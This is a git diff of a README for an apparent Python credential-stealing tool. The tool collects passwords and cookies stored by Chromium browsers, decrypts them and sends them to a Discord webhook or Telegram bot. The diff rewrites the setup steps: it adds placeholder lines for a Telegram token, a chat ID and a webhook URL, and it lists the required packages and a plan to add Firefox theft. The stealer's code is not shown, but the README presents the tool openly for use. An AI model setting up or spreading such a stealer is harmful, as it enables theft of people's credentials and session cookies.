@@ -2,8 +2,6 @@
 gets every password/cookie on a PC stored by a Chromium browser, decrypts it and\
 sends it to your DISCORD WEBHOOK and/or to your TELEGRAM Bot Chat.
 
-# my first Python project, i will revise everything as soon as i got time
-
 
 ![alt text](https://i.imgur.com/CVrMpsS.png)
 ![alt text](https://i.imgur.com/ZPwsFEy.png)
@@ -18,17 +16,21 @@ sends it to your DISCORD WEBHOOK and/or to your TELEGRAM Bot Chat.
 # HOW TO
 open cmd terminal and paste in: ```pip install -r requirements.txt```
 
-![alt text](https://i.imgur.com/G6Z41WG.png)
+```
+token = "TELEGRAM TOKEN"
+chatid = "TELEGRAM CHATID"\
+webhookurl = "WEBHOOK URL"\
 
-remove the "#" for whatever you wanna use, you can also use both\
-line 222 = telegram api    (number 1 on screenshot)\
-line 223 = discord webhook (number 2 on screenshot)
+if you don't understand it you shouldn't use it,
+just add your TELEGRAM TOKEN, CHATID and/or your DISCORD WEBHOOK into these 3 lines 
+```
 
 # REQUIREMENTS
 ```pycryptodomex```\
 ```pysqlite3```\
 ```pypiwin32```\
 ```requests```
+
 # TO DO
 implement firefox, i wan't to make everything as compact as i can and firefox would double everything up\
 still searching for a smart compact way to do it, will update if i found somethin
